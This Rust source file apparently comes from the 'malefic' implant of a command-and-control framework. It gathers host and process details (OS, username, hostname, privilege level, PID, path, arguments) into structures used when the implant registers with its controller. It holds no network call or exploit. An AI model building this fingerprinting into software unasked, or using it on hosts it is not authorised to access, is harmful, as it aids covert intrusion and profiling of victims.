
use malefic_proto::proto::modulepb::{SysInfo, Os, Process};


pub fn get_os() -> Option<Os> {
    let info = malefic_helper::common::sysinfo::default_os().unwrap();
    Some(Os {
        name: info.name,
        version: info.version,
        release: info.release,
        arch: info.arch,
        username: info.username,
        hostname: info.hostname,
        locale: info.locale,
    })
}

pub fn get_sysinfo() -> Option<SysInfo> {
    let info = malefic_helper::common::sysinfo::get_sysinfo();
    let os = info.os?;
    let process = info.process?;
    Some(SysInfo {
        filepath: info.filepath,
        workdir: info.workdir,
        is_privilege: info.is_privilege,
        os: Some(Os {
            name: os.name,
            version: os.version,
            release: os.release,
            arch: os.arch,
            username: os.username,
            hostname: os.hostname,
            locale: os.locale,
        }),
        process: Some(Process {
            name: process.name,
            pid: process.pid,
            ppid: process.ppid,
            arch: process.arch,
            owner: process.owner,
            path: process.path,
            args: process.args,
            uid: "".to_string(),
        })
    })
}

#[cfg(feature = "register_info")]
pub fn get_register_info() -> Option<SysInfo> {
    get_sysinfo()
}

#[cfg(not(feature = "register_info"))]
pub fn get_register_info() -> Option<SysInfo> {
    None
}